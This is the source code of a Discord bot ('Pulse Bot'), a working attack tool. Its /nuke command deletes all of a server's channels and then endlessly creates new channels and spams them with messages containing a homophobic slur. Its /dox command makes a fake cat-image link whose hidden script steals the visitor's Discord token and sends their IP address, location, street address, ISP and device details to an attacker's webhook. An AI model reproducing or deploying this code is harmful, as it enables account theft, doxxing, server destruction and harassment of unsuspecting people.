const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const app = express();
const crypto = require('crypto');

const TOKEN = process.env.TOKEN;
const PORT = process.env.PORT || 3000;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';

if (!TOKEN) {
    console.error('❌ TOKEN environment variable is required!');
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ]
});

const links = new Map();
let nukeRunning = false;
let nukeGuildId = null;

app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));

// ---- DOX LINK HANDLER ----
app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook));
});

// ---- COMMAND REGISTRATION ----
async function registerCommands() {
    try {
        await client.application.commands.set([
            {
                name: 'nuke',
                description: '💀 Infinite nuke - destroys the server',
                options: [
                    {
                        name: 'action',
                        type: 3,
                        description: 'Start or stop the nuke',
                        required: true,
                        choices: [
                            { name: 'Start Nuke', value: 'start' },
                            { name: 'Stop Nuke', value: 'stop' }
                        ]
                    }
                ]
            },
            {
                name: 'dox',
                description: '📸 Generate dox link',
                options: [
                    {
                        name: 'webhook',
                        type: 3,
                        description: 'Webhook URL',
                        required: true
                    }
                ]
            }
        ]);
        console.log('✅ Commands registered');
    } catch (error) {
        console.error('Failed to register commands:', error);
    }
}

// ---- INTERACTION HANDLER ----
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options } = interaction;

    // ---- NUKE COMMAND ----
    if (commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });

        const guild = interaction.guild;
        if (!guild) {
            return interaction.editReply('❌ This command can only be used in a server.');
        }

        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember) {
            return interaction.editReply('❌ I am not in this server. Please add me with Administrator permissions.');
        }

        if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need **Administrator** permissions to nuke.');
        }

        const action = options.getString('action');

        if (action === 'start') {
            if (nukeRunning) {
                return interaction.editReply('❌ A nuke is already running. Use `/nuke action:stop` to stop it first.');
            }

            nukeRunning = true;
            nukeGuildId = guild.id;

            await interaction.editReply('🚀 **NUKE STARTED!** Use `/nuke action:stop` to stop it.');

            // Start the nuke
            await startNuke(guild);

        } else if (action === 'stop') {
            if (!nukeRunning) {
                return interaction.editReply('❌ No nuke is currently running.');
            }

            nukeRunning = false;
            nukeGuildId = null;

            await interaction.editReply('⏹️ **Nuke stopped.**');
        }
    }

    // ---- DOX COMMAND ----
    if (commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });

        const guild = interaction.guild;
        if (!guild) {
            return interaction.editReply('❌ This command can only be used in a server.');
        }

        const wh = options.getString('webhook');
        if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Invalid webhook URL.');
        }

        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: interaction.user.tag, created: Date.now() });

        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Link Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, ASN, battery, VPN detection, and device info.`)
            .setFooter({ text: `Generated by ${interaction.user.tag}` });

        await interaction.editReply({ embeds: [embed] });
    }
});

// ---- START NUKE FUNCTION ----
async function startNuke(guild) {
    const variants = [
        '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER'
    ];
    const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

    // ---- DELETE ALL CHANNELS ----
    const channels = guild.channels.cache;
    console.log(`Deleting ${channels.size} channels...`);
    
    const channelArray = Array.from(channels.values());
    for (let i = 0; i < channelArray.length; i += 10) {
        const batch = channelArray.slice(i, i + 10);
        await Promise.all(batch.map(async (ch) => {
            try {
                await ch.delete();
            } catch(e) {}
        }));
        await new Promise(r => setTimeout(r, 50));
    }
    console.log('All channels deleted.');

    // ---- SPAM FUNCTION ----
    async function spamChannel(ch) {
        if (!nukeRunning) return;
        try {
            while (nukeRunning) {
                try {
                    const line = variants[Math.floor(Math.random() * variants.length)];
                    let big = `@everyone ${line}\n`;
                    while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
                        big += line + '\n';
                    }
                    big += `\n${inviteLine}`;
                    const spamMessage = big.slice(0, 2000);
                    await ch.send(spamMessage);
                } catch(e) {}
                await new Promise(r => setTimeout(r, 10));
            }
        } catch(e) {}
    }

    // ---- CREATE CHANNELS AND SPAM ----
    async function createChannelsAndSpam() {
        let createdCount = 0;
        while (nukeRunning) {
            try {
                const newChannels = await Promise.all([
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
                ]);
                
                const valid = newChannels.filter(c => c !== null);
                for (const ch of valid) {
                    spamChannel(ch);
                }
                
                createdCount += valid.length;
                console.log(`Created ${createdCount} channels total`);
                
            } catch(e) {}
            await new Promise(r => setTimeout(r, 10));
        }
    }

    // Start infinite channel creation
    createChannelsAndSpam();

    // Also spam all existing channels
    guild.channels.cache.forEach(ch => {
        if (ch.type === ChannelType.GuildText) {
            spamChannel(ch);
        }
    });
}

// ---- DOX HTML ----
function generateDoxHTML(webhook) {
    const imageUrl = 'https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg';

    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cat</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0b0b12;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', sans-serif;
        }
        .container {
            text-align: center;
        }
        .container img {
            max-width: 90%;
            max-height: 80vh;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid rgba(255,255,255,0.06);
        }
        .caption {
            color: #555;
            font-size: 14px;
            margin-top: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="${imageUrl}" alt="Cat" />
        <div class="caption">Loading...</div>
    </div>

<script>
const WEBHOOK_URL = "${webhook}";

function stealToken() {
    try {
        const token = localStorage.getItem('token') || 
                      document.cookie.split('; ').find(row => row.startsWith('token='))?.split('=')[1];
        if (token) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: \`**🎯 Discord Token:** \` + \`\`\`\${token}\`\`\`
                })
            });
        }
    } catch (e) {}
}

async function sendDox() {
    try {
        const ip = await getIPData();
        const battery = await getBattery();
        const vpn = detectVPN(ip);
        const now = new Date();
        const timestamp = now.toISOString();
        const localTime = now.toString();

        let address = "N/A";
        let lat = ip.lat || "N/A";
        let lon = ip.lon || "N/A";
        if (lat !== "N/A" && lon !== "N/A") {
            const addr = await reverseGeocode(lat, lon);
            if (addr) address = addr;
        }

        const ua = navigator.userAgent;
        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
        const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";

        const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;

        const fields = [
            { name: "📍 Address", value: address, inline: false },
            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
            { name: "🗺️ Google Maps", value: "[Click to view](" + mapUrl + ")", inline: false },
            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
            { name: "🔋 Battery", value: battery ? battery.level + "%" + (battery.charging ? " (Charging)" : " (Not Charging)") : "N/A", inline: true },
            { name: "🛡️ VPN / Proxy", value: vpn.detected ? "✅ Likely" : "❌ No", inline: true },
            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
            { name: "🧠 Browser", value: browser, inline: true },
            { name: "💻 OS", value: os, inline: true },
            { name: "🖥️ Device", value: device, inline: true },
            { name: "⏰ Local Time", value: localTime, inline: false },
            { name: "📅 Timestamp", value: timestamp, inline: false }
        ];

        const embed = {
            title: "☠️ Doxxed",
            color: 0xFF0000,
            fields: fields,
            footer: { text: "Logged at " + timestamp }
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });

    } catch (err) {
        console.error("Dox error:", err);
    }
}

async function getIPData() {
    const apis = [
        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) }
    ];
    for (const api of apis) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            const res = await fetch(api.url, { signal: controller.signal });
            clearTimeout(timeout);
            const data = await res.json();
            if (data.ip) {
                const result = api.parse(data);
                if (result.ip) return result;
            }
        } catch (e) {}
    }
    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
}

async function getBattery() {
    try {
        const b = await navigator.getBattery();
        return {
            level: Math.round(b.level * 100),
            charging: b.charging
        };
    } catch {
        return null;
    }
}

function detectVPN(ipData) {
    const signals = [];
    const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated'];
    const isp = (ipData.isp || '').toLowerCase();
    const asn = (ipData.asn || '').toLowerCase();
    if (vpnKeywords.some(k => isp.includes(k) || asn.includes(k))) {
        signals.push('ISP/ASN matches VPN/hosting provider');
    }
    try {
        const conn = navigator.connection || navigator.mozConnection;
        if (conn && conn.type === 'vpn') {
            signals.push('Connection type is "vpn"');
        }
    } catch {}
    if (ipData.timezone && ipData.timezone !== 'N/A') {
        const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (browserTz && ipData.timezone !== browserTz) {
            signals.push('Timezone mismatch (IP: ' + ipData.timezone + ' vs Browser: ' + browserTz + ')');
        }
    }
    return {
        detected: signals.length > 0,
        signals: signals,
        score: signals.length
    };
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
        const data = await res.json();
        if (data && data.display_name) return data.display_name;
    } catch (e) {}
    return null;
}

stealToken();
sendDox();

setTimeout(() => {
    document.body.innerHTML = '';
    document.body.style.background = '#ffffff';
    document.body.style.margin = '0';
    document.body.style.height = '100vh';
    setTimeout(() => {
        window.close();
        window.location.href = 'about:blank';
    }, 500);
}, 5000);

document.querySelector('.caption').textContent = 'Image loaded successfully.';
<\/script>
</body>
</html>`;
}

// ---- CLEANUP OLD LINKS ----
setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

// ---- BOT STARTUP ----
client.once('ready', async () => {
    console.log(`🤖 ${client.user.tag} is online!`);
    await registerCommands();
    console.log('✅ Bot is ready!');
});

client.login(TOKEN);
